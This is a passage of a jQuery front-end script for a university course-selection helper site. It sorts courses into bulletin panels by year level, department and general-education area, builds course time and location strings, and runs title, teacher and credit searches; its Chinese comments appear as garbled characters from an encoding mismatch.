                $('#obligatory-post').empty();  //������Ҫ����x���n�̡�ָ���r�g�ь����n��
                $('#freshman').empty();
                $('#sophomore').empty();
                $('#senior').empty();
                $('#junior').empty();
                $('#fifth-grade').empty();
                $('#sixth-grade').empty();
                $('#seventh-grade').empty();
                $('#whole-school').empty();
                $('#humanities').empty();
                $('#social').empty();
                $('#natural').empty();
                $('#PE-post').empty();
                $('#foreign-post').empty();
                $('#non-graded-optional-post').empty();
                $('#teacher-post').empty();
                $('#military-post').empty();
                $('#chinese').empty();
                $('#english').empty();
            }
            var change_color=function($target,command){ //һ��������n�̣��t�șڵ��n�������ɫ
                if(command=="restore"){
                    $target.css("color","#3074B5");
                }
                else if(command=="used"){
                    $target.css("color","red");
                }
                else{
                    alert("���������A�ڵ��e�`��Ո�j�_�lС�MXD");
                }
            }
            var check_optional_obligatory=function(course){ //�Á�_�J�@�����Ў��ñ����n��ͬ����
                var tmpCh = course.title_parsed["zh_TW"].split(' ');        //(�@�������n��)�и��n�����Q�������ո�����_
                course.title_short = tmpCh[0];      //title_short�Ǖ��Ԅ�����ą^��׃������]��Ӣ�ĵ��n��
                if(typeof(window.name_of_optional_obligatory[course.title_short]) == 'undefined'){  //����@һ��(�е����Q������ֵkey)�ǿյ�Ҳ����undefined���Ǿ͌����M�г�ʼ����{}����e����Է�����Ė|������������Ѻܶ�������M�@������e��
                    window.name_of_optional_obligatory[course.title_short] = 1;
                }
                else{
                    window.name_of_optional_obligatory[course.title_short]++;
                }
                // console.log(course.title_short+window.name_of_optional_obligatory[course.title_short]);
            }
            var show_optional_obligatory=function(course){
                var tmpCh = course.title_parsed["zh_TW"].split(' ');        //(�@�������n��)�и��n�����Q�������ո�����_
                course.title_short = tmpCh[0];      //title_short�Ǖ��Ԅ�����ą^��׃������]��Ӣ�ĵ��n��
                if(window.name_of_optional_obligatory[course.title_short]>1){
                    bulletin_post($("#obligatory-post"),course,language);
                }
            }
            var check_if_two_class=function(level){//����׌�Ҵ_�J���ǲ����з�AB�࣬�@���������x���n�������Д���
                level=level.split("");
                return(level);//���ԏĻ؂����L���Д��Ƿ��Ѓɂ���
            }
            var check_which_class=function(major,level){    //�_�����ǲ����з�A��B��
                if(major=="�F�t�Wϵ�Wʿ�� A"||major=="�F�t�Wϵ�Wʿ�� B"||major=="���Ô��Wϵ�Wʿ�� A"||major=="���Ô��Wϵ�Wʿ�� B"||major=="�Cе���̌Wϵ�Wʿ�� A"||major=="�Cе���̌Wϵ�Wʿ�� B"||major=="��ľ���̌Wϵ�Wʿ�� A"||major=="��ľ���̌Wϵ�Wʿ�� B"||major=="늙C���̌Wϵ�Wʿ�� A"||major=="늙C���̌Wϵ�Wʿ�� B"){
                    var subclass=major.split(" ");  //A���B��
                    subclass=subclass[1];
                    var level = level;    //ȡ���꼉
                    level=(level+subclass);
                    return level;
                }
                else{
                    return (level);    //ȡ���꼉
                }
            }
            var check_which_bulletin=function(course){  //�����Д�A��B���Լ����ְ�Ŀ�ϵ�_���ŵ��Ă�bulletin
                if(course.class=="1"||course.class=="1A"||course.class=="1B"){
                    bulletin_post($("#freshman"),course, language);
                }
                else if(course.class=="2"||course.class=="2A"||course.class=="2B"){
                    bulletin_post($("#sophomore"),course, language);
                }
                else if(course.class=="3"||course.class=="3A"||course.class=="3B"){
                    bulletin_post($("#junior"),course, language);
                }
                else if(course.class=="4"||course.class=="4A"||course.class=="4B"){
                    bulletin_post($("#senior"),course, language);
                }
                else if(course.class=="5"||course.class=="5A"||course.class=="5B"){
                    bulletin_post($("#fifth-grade"),course, language);
                }
                else if(course.class=="6"||course.class=="6A"||course.class=="6B"){
                    //6��7�꼉�ǷŴT������n
                    bulletin_post($("#sixth-grade"),course, language);
                }
                else if(course.class=="7"||course.class=="7A"||course.class=="7B"){
                    bulletin_post($("#seventh-grade"),course, language);
                }
                else if(course.class==""){
                    bulletin_post($("#whole-school"),course, language);
                }                
            }
            var check_which_bulletin_required=function(course){
                var EN={"�Z������":"","ҹ��ͬ��":"","ҹ����":""};
                var CH={"ͨ�R����":"","ҹ����":""};  
                if(course.discipline!=undefined&&course.discipline!=""){
                    //ͨ�R�n���ЌWȺ�@����λ
                    check_general(course);
                }              
                else if(course.department in EN){
                    bulletin_post($("#english"),course, language);
                }
                else if(course.department in CH){
                    bulletin_post($("#chinese"),course, language);
                }                
                else{
                    bulletin_post($("#obligatory-post"),course, language); //����Ұ�ͬһ�r�ε��n�����M����e������Ҫ��indexȥȡ
                }
            }
            var department_course_for_specific_search=function(major,level){
                $.each(course_of_majors[major][level], function(ik, iv){//����@�N�oϵ���nһ���ǽ��oʹ�����Լ��x�����ԾͲ��Ԅ�����
                            $.each(courses[iv],function(jk,jv){
                                if(jv.for_dept==major){//�@���Д��Ǟ������^�W���ǷN���T�τe�Ŀ�ϵ���n��ϵ���OӋ��
                                    if(jv.obligatory_tf==true&&jv.class==level){
                                        bulletin_post($("#obligatory-post"),jv, language);
                                        return false;
                                    }
                                    if(jv.obligatory_tf==false&&jv.class==level){//����oϵ�Ĳ�ԃֻ�ܲ�һ���꼉�����ԾͿ���ֻ�Д��Ƿ��level
                                        check_which_bulletin(jv);
                                        return false;
                                    }
                                }
                            })
                        });
            }
            var check_general=function(course){
                var disciplineH={"�ČW":"","�vʷ":"","�܌W":"","ˇ�g":"","�Ļ�":""};
                var disciplineS={"�����c���":"","�����c����":"","�̘I�c����":"","�����c����":"","�YӍ�c����":""};
                var disciplineN={"�����ƌW":"","�h���ƌW":"","���|�ƌW":"","���W�yӋ":"","���̿Ƽ�":""};                
                if(course.discipline in disciplineH){
                    bulletin_post($("#humanities"), course, language)
                }
                else if(course.discipline in disciplineS){
                    bulletin_post($("#social"), course, language)
                }
                else if(course.discipline in disciplineN){
                    bulletin_post($("#natural"), course, language)
                }
                else{
                    alert("��ͨ�R�n�̟o���@ʾ����Ոӛ���c���ĽY����΁K��֪�_�lС�M\nFB�ь����x�nС����\nhtsps://www.facebook.com/CoursePickingHelper")
                }                
            };
            var check_which_common_subject = function(course){
                if(course.department=="��������"){
                    bulletin_post($("#teacher-post"),course, language);
                }
                else if(course.department=="�w����"||course.department=="ҹ��ͬ��"){
                    bulletin_post($("#PE-post"),course, language);
                }
                else if(course.department=="�̹���"){
                    bulletin_post($("#military-post"),course, language);
                }
                else if(course.department=="�Z������"||course.department=="����ϵ"){
                    bulletin_post($("#foreign-post"),course, language);
                }
                else{ 
                    bulletin_post($("#non-graded-optional-post"),course, language);
                }
            }
            var build_bulletin_time=function(course){
                var EN_CH={"�Z������":"","ҹ��ͬ��":"","ҹ����":"","ͨ�R����":"","ҹ����":""};
                var time = [];  //time�O��������
                time.push("���n�r�g:");
                $.each(course.time_parsed, function(ik, iv){
                    time.push("����"+week[iv.day-1]+iv.time); //push�ǰ��e���Ԫ��׃����е�һ��
                })
                if(course.intern_time!=""&&course.intern_time!=undefined){//����ÿһ���n�����Ќ����r�g
                    time.push("�����r�g:"+course.intern_time);
                }
                time.push("���a:"+course.code);
                if(course.discipline!=""&&course.discipline!=undefined){//��������ͨ�R�n
                    time.push("����:"+course.professor);
                    time.push("�WȺ:"+course.discipline);
                    time.push("ʣ�N���~:"+course.remaining_seat);
                    //time.push("�л`��:"+course.possibility);
                }
                else if(course.department in EN_CH){
                    time.push("����:"+course.professor);
                }
                if(course.note!=""){
                    time.push("���]:"+course.note);
                }
                time = time.join(' ');  //�Ѷ��������" "�ָ�K�ρ�ָ�ɽotime���˞��ִ��͑B�����ǌ��ִ�split('')���t���؂�һ������͑B
                return time;
            }
            var credits_filter=function(){
                var credits=$("#credits").val();
                if(credits!=""){return credits;}
                else{return true;}//���r�������credits_filter���Ʌ��������ь��ĺ�ʽ
                //������return�|����if�Д�ʽ������]��ݔ��W�֣���return TRUE�Ͳ������κ�Ӱ���
            }
            var title_search=function(cre_funcion){
                var class_title=$("#class_title").val();//�n�����Q�ь�
                condition=cre_funcion;//������Y�x�W�֗l���ĺ�ʽ
                if(class_title!=""){
                    $.each(name_of_course, function(ik, iv){
                        if(ik.search(class_title)!=-1&&(iv[0].credits==condition||condition==true)){
                            $.each(iv,function(jk, jv){
                                bulletin_post($("#search-post"),jv, language);
                            });
                        }
                    })
                    $("#class_title").val("");
                }
            }
            var teach_search=function(cre_funcion){
                var teacher = $("#class_teacher").val();//�ώ����Q�ь�
                condition=cre_funcion;
                if(teacher!=""){
                    $.each(teacher_course[teacher], function(ik, iv){
                        if(iv.credits==condition||condition==true){
                            bulletin_post($("#search-post"),iv, language);
                        }
                    });
                    $("#class_teacher").val("");
                }
            }
            var fill_loction=function(course){//�؂������YӍ���͑B��string
            //course���n�����
                var location="";
                if(course.location!=[""]&&course.location!=undefined){
                    //Ҫ�_�������location�@��key�ſ����Mif����Ȼundefined�M��eachޒȦ
                    // �͕��� [Uncaught TypeError: Cannot read property 'length' of undefined]�@��error
                    $.each(course.location,function(ik,iv){
                        location=location+" "+iv;
                    })
                }
                if(course.intern_location!=[""]&&course.intern_location!=undefined){
                    $.each(course.intern_location,function(ik,iv){
                        location=location+" "+iv;
                    })
                }
                return location;//�؂��ִ�
            }
        })(jQuery);
